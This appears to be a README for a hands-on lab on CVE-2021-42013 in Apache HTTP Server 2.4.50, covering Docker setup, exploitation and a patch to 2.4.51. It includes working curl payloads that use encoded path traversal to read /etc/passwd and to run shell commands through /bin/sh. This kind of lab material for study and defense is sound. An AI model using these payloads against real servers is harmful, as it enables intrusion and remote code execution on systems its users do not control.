CVE-2021-42013 Lab: Apache HTTP Server Path Traversal and Remote Code Execution
Overview

This lab provides a hands-on environment to understand and exploit the CVE-2021-42013 vulnerability in Apache HTTP Server 2.4.50. The vulnerability allows attackers to perform path traversal and potentially achieve remote code execution (RCE) under specific configurations.
Lab Components

    Exploit Script: A Python script to demonstrate the vulnerability.

    Remediation Script: A Bash script to patch the vulnerability.

    Dockerfile: Sets up a vulnerable Apache HTTP Server environment.

    README: Instructions for setting up and running the lab.

Setup Instructions
Prerequisites

    Docker installed on your system.

    Git installed to clone the repository.

Steps

    Clone the Repository

git clone https://github.com/yourusername/CVE-2021-42013-Lab.git
cd CVE-2021-42013-Lab

Build the Docker Image

docker build -t cve-2021-42013-lab .

Run the Docker Container

    docker run -dit -p 8080:80 --name apache-vuln cve-2021-42013-lab

    The vulnerable Apache server will be accessible at http://localhost:8080.

Exploitation
Path Traversal

To read the /etc/passwd file:

curl "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

Remote Code Execution (RCE)

To execute a command (e.g., id):

curl "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; id"

Note: The above payloads exploit the path traversal to access sensitive files and execute commands.
Remediation

To patch the vulnerability:

    Stop and Remove the Vulnerable Container

docker stop apache-vuln
docker rm apache-vuln

Build a Patched Docker Image

docker build -t apache-patched -f Dockerfile.patched .

Run the Patched Container

    docker run -dit -p 8080:80 --name apache-secure apache-patched

    The patched Apache server will be accessible at http://localhost:8080.

Files Included

    Dockerfile: Sets up Apache HTTP Server 2.4.50 with vulnerable configurations.

    Dockerfile.patched: Sets up Apache HTTP Server 2.4.51 with secure configurations.

    exploit.py: Python script demonstrating the exploit.

    remediate.sh: Bash script to patch the vulnerability.

    README.md: This instruction file.

References

    NVD - CVE-2021-42013

    Apache HTTP Server Security Advisories

    Exploit-DB Entry

This lab is intended for educational purposes only. Always ensure you have proper authorization before testing systems for vulnerabilities.